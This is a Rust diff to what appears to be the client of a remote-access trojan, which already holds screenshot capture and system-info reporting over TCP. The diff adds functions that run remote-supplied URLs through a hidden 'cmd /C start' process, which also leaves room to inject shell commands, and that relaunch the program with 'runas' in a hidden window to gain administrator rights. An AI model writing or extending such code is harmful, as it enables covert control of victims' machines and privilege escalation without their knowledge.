@@ -1,6 +1,7 @@
 use std::net::TcpStream;
 use screenshots::{ image, Screen };
 use std::io::Cursor;
+use std::os::windows::process::CommandExt;
 
 use sysinfo::{ System, Disks };
 
@@ -9,12 +10,20 @@ use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory };
 use winapi::shared::dxgi::IDXGIAdapter;
 use winapi::Interface;
 
+use winapi::um::shellapi::{ ShellExecuteW, ShellExecuteExW, SHELLEXECUTEINFOW };
+use winapi::um::winuser::{ SW_HIDE, SW_SHOW, SW_SHOWNORMAL };
+use winapi::shared::minwindef::{ HINSTANCE, UINT };
+
 use winapi::um::winuser::EnumDisplayMonitors;
 use winapi::shared::windef::{ HMONITOR, HDC, RECT };
 use winapi::shared::minwindef::{ BOOL, LPARAM };
 use std::ptr;
 
+use std::ffi::OsStr;
+use std::os::windows::ffi::OsStrExt;
+
 use crate::service::install::is_elevated;
+use crate::service::mutex;
 
 use common::buffers::write_buffer;
 use common::commands::{ ClientInfo, Command };
@@ -108,6 +117,63 @@ pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
     };
 
     write_buffer(write_stream, Command::Client(client_data), secret);
+}
+
+pub fn visit_website(
+    write_stream: &mut TcpStream,
+    visit_type: &str,
+    url: &str,
+    secret: &Option<Vec<u8>>
+) {
+    const DETACH: u32 = 0x00000008;
+    const HIDE: u32 = 0x08000000;
+
+    if visit_type == "normal" {
+        println!("Opening URL: {}", url);
+        std::process::Command
+            ::new("cmd")
+            .args(&["/C", "start", url])
+            .creation_flags(HIDE | DETACH)
+            .spawn()
+            .unwrap();
+    }
+}
+
+pub fn elevate_client() {
+    let mut mutex_lock_guard = crate::MUTEX_LOCK.lock().unwrap();
+
+    println!("{:?}", is_elevated());
+
+    if is_elevated() {
+        return;
+    }
+
+    mutex_lock_guard.unlock();
+
+    let exe = std::env::current_exe().unwrap();
+    let path = exe.to_str().unwrap();
+
+    let operation = OsStr::new("runas");
+    let path_os = OsStr::new(path);
+    let operation_encoded: Vec<u16> = operation.encode_wide().chain(Some(0)).collect();
+    let path_encoded: Vec<u16> = path_os.encode_wide().chain(Some(0)).collect();
+
+    unsafe {
+        let h_instance = ShellExecuteW(
+            ptr::null_mut(),
+            operation_encoded.as_ptr(),
+            path_encoded.as_ptr(),
+            ptr::null(),
+            ptr::null(),
+            SW_HIDE
+        );
+
+        if (h_instance as UINT) > 32 {
+            std::process::exit(1);
+        } else {
+            mutex_lock_guard.lock();
+        }
+    }
 }
 
 const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
